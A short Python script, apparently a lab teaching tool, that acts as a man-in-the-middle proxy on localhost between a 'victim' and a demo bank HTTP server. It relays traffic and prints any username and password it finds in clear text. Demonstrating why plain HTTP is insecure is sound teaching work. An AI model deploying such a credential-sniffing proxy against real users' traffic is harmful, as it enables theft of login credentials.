# mitm_http_proxy.py -- a minimal "man in the middle" for PLAIN HTTP traffic. LAB USE ONLY.
# Sits between a victim and bank_http_server.py, forwards traffic, and LOGS every byte,
# including usernames and passwords, because plain HTTP carries them in clear text.
# Run:  python mitm_http_proxy.py      ->  listens on 127.0.0.1:6001, forwards to 127.0.0.1:6000
import re
import socket
import threading

LISTEN_HOST, LISTEN_PORT = "127.0.0.1", 6001
TARGET_HOST, TARGET_PORT = "127.0.0.1", 6000


def pump(src, dst, tag):
    while True:
        data = src.recv(4096)
        if not data:
            break
        text = data.decode(errors="replace")
        m = re.search(r"username=([^&\s]+)&password=([^&\s]+)", text)
        if m:
            print(f"[MITM] *** CAPTURED CREDENTIALS *** username={m.group(1)} password={m.group(2)}")
        dst.sendall(data)
    try:
        dst.shutdown(socket.SHUT_WR)
    except OSError:
        pass


def handle(client_sock):
    server_sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
    t1 = threading.Thread(target=pump, args=(client_sock, server_sock, "C->S"))
    t2 = threading.Thread(target=pump, args=(server_sock, client_sock, "S->C"))
    t1.start(); t2.start()
    t1.join(); t2.join()
    client_sock.close(); server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[MITM] listening on {LISTEN_HOST}:{LISTEN_PORT}, forwarding to {TARGET_HOST}:{TARGET_PORT}")
    while True:
        client_sock, addr = srv.accept()
        threading.Thread(target=handle, args=(client_sock,), daemon=True).start()


if __name__ == "__main__":
    main()
